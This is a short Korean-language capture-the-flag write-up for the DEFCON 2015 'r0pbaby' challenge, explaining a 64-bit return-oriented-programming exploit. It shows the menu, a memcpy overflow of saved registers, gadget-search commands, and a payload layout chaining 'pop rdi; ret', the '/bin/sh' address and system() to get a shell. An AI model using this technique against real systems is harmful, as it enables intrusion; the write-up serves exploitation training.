# r0pbaby

DEFCON 2015 r0pbaby 문제

  - 64bit ROP
  - Give libc, system address


## Overview

  - Libc, system 주소를 제공해주므로 ROP를 이용해 쉘을 획득할 수 있다.
  - 필요한 가젯은 다음과 같다.
    1 pop rdi ; ret; ==> rp++ -f libc-2.23.so -r 4 | grep "pop rdi ; ret"
    2 /bin/sh 주소 ==> strings -tx libc-2.23.so | grep "/bin/sh"


## Vulnerability

```
Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
:
```

  - 1번 메뉴에서 libc의 주소를 출력하긴 하지만 디버깅 결과 실제 주소와 달라서, 2번 메뉴를 통해 알 수 있는 system 함수의 offset을 통해 구했다.

```c
char nptr[1088]; // [sp+10h] [bp-440h]@2
__int64 savedregs; // [sp+450h] [bp+0h]@22
    ...
memcpy(&savedregs, nptr, length);
```

  - 3번 메뉴를 통해 사용자의 입력을 받는다. memcpy(&savedregs, nptr, length);로 입력받은 nptr 값을 savedregs로 옮기는데 이 값이 sfp이므로 8bytes만 더 입력하면 ret을 덮을 수 있다.
  - 함수 인자는 rdi, rsi, rdx, rcx, r8, r9 순서로 넘겨지게 된다.
  - [dummy 8bytes] + [pop rdi ; ret; 8bytes] + [/bin/sh address 8bytes] + [system address 8bytes]

